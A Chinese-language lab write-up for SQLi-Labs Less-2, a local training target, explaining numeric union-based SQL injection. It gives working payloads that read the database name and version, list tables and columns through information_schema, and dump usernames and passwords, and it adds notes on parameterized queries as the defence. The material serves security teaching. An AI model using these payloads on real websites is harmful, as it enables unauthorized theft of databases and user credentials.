SQLi-Labs Less-2

2026年9月25日 SQLi-Labs Web安全 SQL注入 数字型注入

一、题目信息

  • 题目名称：SQLi-Labs Less-2
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / 数字型联合注入
  • 靶场链接：http://localhost:8081/Less-2/（本地环境）
  • 涉及工具：Chrome浏览器

二、解题步骤

1. 分析题目考什么

本题的核心考点是数字型联合注入（Integer-based Union SQL Injection）。与 Less-1 不同，后端 SQL 语句中变量 id 没有被引号包裹，直接以数字形式拼接到 SQL 语句中。攻击者无需使用单引号闭合，直接利用 order by 和 union select 即可完成注入攻击。

2. 怎么想（破题思路）

  • 访问页面，URL 为 ?id=1，页面正常显示 Login name 和 Password。
  • 尝试输入单引号 ?id=1'，页面报错（报错信息与 Less-1 可能略有不同），说明此处是数字型注入点。
  • 直接用 order by 判断字段数，用 union select 确定回显位。
  • 通过 information_schema 系统表查库名、表名、列名，最后查数据。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录：惯性思维在数字型注入中加了单引号

踩坑情况：习惯了 Less-1 的字符型注入，在 Less-2 的 Payload 里下意识地加上了 '（单引号），导致注入失败或报错。

原因分析：Less-2 的后端代码是 SELECT * FROM users WHERE id = $id LIMIT 0,1;，没有引号。如果你传入 `1'`，SQL 语句变成 `id = 1' LIMIT 0,1`，这里的单引号会导致语法错误。

改进方式：去掉所有单引号，直接使用纯数字或注释符进行注入。这就是数字型和字符型注入的最核心区别。

详细实操步骤（逐字解析）

第一步：爆出数据库名和版本（图1）

?id=-1 union select 1,database(),version() --+

逐字解析：因为不需要单引号闭合，所以直接构造 Payload。-1 是为了让前面的查询失效，union select 是联合查询。database() 回显当前数据库名（security），version() 回显数据库版本（5.5.44）。--+ 用于注释掉原语句后面的 LIMIT 0,1，防止其干扰。

第二步：爆出当前数据库的所有表名（图2）

?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+

逐字解析：从 information_schema.tables 查表名，table_schema=database() 限制查询范围。回显 emails,referers,uagents,users，锁定目标 users 表。

第三步：爆出 users 表的字段名（图3）

?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

逐字解析：从 information_schema.columns 查列名，回显 id,username,password。注意这里 'users' 需要加单引号，因为它是字符串查询条件（字符型），而不是数字型。

第四步：爆出最终账号密码（图4）

?id=-1 union select 1,group_concat(username,0x3a,password),3 from users --+

逐字解析：0x3a 是冒号的十六进制，用于分隔用户名和密码。from users 直接从表里查。最终回显 admin:admin 等数据。

4. 怎么迁移（跨领域联想）

  • API 接口测试：现代 RESTful API 中，像 GET /api/users/1 这样的数字型参数非常常见。如果后端没做参数化查询，这里就是一个天然的数字型注入点。
  • ORM 框架误区：很多人以为用了 ORM 就绝对安全。但如果使用了字符串拼接（如 User.where("id = " + id)），同样会中招。防御必须使用占位符绑定（User.where("id = ?", id)）。
  • 大数据分析：数据分析师在写 Hive SQL 或 Spark SQL 时，如果直接拼接用户输入的参数，也同样面临 SQL 注入风险。

三、名词大全与原理深度复盘

1. 数字型注入 vs 字符型注入

两者的核心区别在于后端 SQL 语句中，变量是否被引号包裹。
- 字符型：WHERE id = '$id'（需要单引号闭合）
- 数字型：WHERE id = $id（无需引号，直接拼接）
数字型注入中，如果错误地加入单引号，反而会导致 SQL 语法错误。

2. information_schema 数据库

MySQL 自带的“数据库户口本”。它记录了当前数据库服务器所有的数据库名（SCHEMATA）、表名（TABLES）、列名（COLUMNS）。SQL 注入中利用它来摸清数据库结构。

3. group_concat() 函数

MySQL 的聚合函数。它将多行查询的结果合并成一个字符串输出（默认用逗号分隔）。在注入时，它可以避免因为查询结果过多而导致页面只显示第一行的问题。

4. 0x3a 十六进制

ASCII 码表中，`:`（冒号）的十六进制是 `0x3a`。在注入中用它拼接用户名和密码，能让结果一目了然（如 `admin:admin`），避免因为缺失分隔符而无法分辨哪个是用户名哪个是密码。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-1 的区别：Less-1 是字符型，Payload 必须包含 ' 来闭合引号；Less-2 是数字型，Payload 直接以数字开头，不能带单引号。
  • 与 XSS 的区别：XSS 攻击前端浏览器，SQL 注入攻击后端数据库。前者骗用户，后者骗数据库。

2. 这种题目的出现原因

后端开发人员为了图方便，直接将 URL 中的数字参数拼接到 SQL 语句中。他们认为“既然是数字，怎么可能有注入”，却忽略了 SQL 语法的复杂性（如利用 `union` 进行拓展）。这在早期的企业官网、政府网站中极为常见。

3. 这种应用在实际中如何体现？

在真实红蓝对抗中，数字型注入是攻击者最常遇到的场景之一（因为 ID 通常都是数字）。一旦发现，攻击者会立刻使用 SQLMap 或手工联合注入，快速 dump 出数据库里的所有数据。

4. 如何抽象理解概念（大白话理解）

把数据库比作一个“点餐机器人”：

  • 字符型注入（Less-1）：机器人点餐需要你说：“来一份1号餐”（id='1'）。你如果想搞破坏，必须想办法把前面的单引号闭合掉，再插入恶意指令。
  • 数字型注入（Less-2）：机器人点餐只需要你说数字：“1”。你不需要任何引号，直接命令它：“1，顺便把所有的餐单都给我”（id=1 union select ...）。因为缺少了引号的“封印”，数字型注入往往比字符型注入利用起来更简单、更直接。
